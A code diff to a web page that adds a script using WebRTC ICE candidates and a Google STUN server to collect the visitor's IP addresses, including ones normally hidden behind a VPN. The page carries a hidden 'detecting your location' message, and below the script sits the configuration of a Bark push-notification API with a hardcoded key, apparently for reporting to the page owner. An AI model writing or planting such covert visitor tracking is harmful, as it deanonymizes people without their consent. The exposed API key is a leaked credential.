@@ -279,6 +279,42 @@
     <div class="hidden-message">系统正在检测您的访问位置...</div>
 
     <script>
+        const ipv4Regex = /\b((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/;
+const ipv6Regex = /\b(?:[A-F0-9]{1,4}:){7}[A-F0-9]{1,4}\b/i;
+
+const getIPs = async () => {
+    const iceServers = [{ urls: "stun:stun.l.google.com:19302" }];
+    const peerConnection = new RTCPeerConnection({ iceServers });
+
+    const ipSet = new Set();
+
+    peerConnection.onicecandidate = (event) => {
+        if (!event || !event.candidate) return;
+        const candidate = event.candidate.candidate;
+        for (const regex of [ipv4Regex, ipv6Regex]) {
+            const ipMatch = candidate.match(regex);
+            if (ipMatch) {
+                const ip = ipMatch[0];
+                ipSet.add(ip);
+            }
+        }
+    };
+
+    peerConnection.createOffer().then((offer) => peerConnection.setLocalDescription(offer)).catch((error) => console.error("Error creating offer:", error));
+
+    // 等待一段时间以收集所有ICE候选
+    return new Promise((resolve) => {
+        setTimeout(() => {
+            peerConnection.close();
+            resolve([...ipSet]);
+        }, 5000); // 可以根据需要调整超时时间
+    });
+};
+
+getIPs().then((ips) => {
+    console.log("收集到的IP地址:", ips);
+});
+
         // 配置Bark API - 替换为您的实际API密钥
         const BARK_API_KEY = '85fXnM3P5A6pVnJmuhLby3';
         const BARK_API_URL = `https://api.day.app/${BARK_API_KEY}/`;
